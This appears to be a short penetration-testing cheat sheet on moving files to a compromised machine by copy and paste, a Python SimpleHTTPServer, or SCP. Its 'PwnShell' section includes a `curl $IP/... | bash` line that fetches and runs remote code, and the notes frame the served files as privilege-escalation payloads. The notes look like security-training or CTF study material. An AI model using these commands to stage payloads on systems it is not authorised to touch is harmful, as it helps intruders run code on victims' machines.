# Transporting Files 📦

### Transport - Table of Contents 
   1. Copy & Paste 
   2. Python WebServer 
   3. SCP (through SSH)

## 1) Copy & Paste
  + Could just try _Copy&Paste_

--------------------------------------------------------------
### + + + + + + + + + + + + + + + + + + + + + + +
## 2) Python WebServer

- - - - - - - - - - - - - - - - - - - - - - - - - - - - -

1. Setup python webserver on local machine:
  + `python2 -m SimpleHTTPServer`
   - Run this **in the directory** where I have _interesting payloads_
    * Such as _PrivEsc scripts/binaries_
- - - - - - - - - - - - - - - - - - - - - - - - - - - - -

2. On the _compromised machine_ / `shell`
  + Try _visiting the web page_ of my _python webserver_
   - `http://$PY_SERVER_IP`
  
  + [Linux]: Try using `curl` or `wget`
   - `wget $PY_SERVER_IP/directory_to/file`
   - `curl $PY_SERVER_IP/directory_to/file`
  
- - - - - - - - - - - - - - - - - - - - - - - - - - - - -

* PwnShell (Linux): `curl` or `wget`
 - `wget $IP/directory_to/file`
 - `curl $IP/directory_to/file | bash`

- - - - - - - - - - - - - - - - - - - - - - - - - - - - -

--------------------------------------------------------------
### + + + + + + + + + + + + + + + + + + + + + + +
## 3) SCP (through SSH)
 * If _ssh is available,_ try using `scp`

-------------------------------------------------------------
### + + + + + + + + + + + + + + + + + + + + + + +
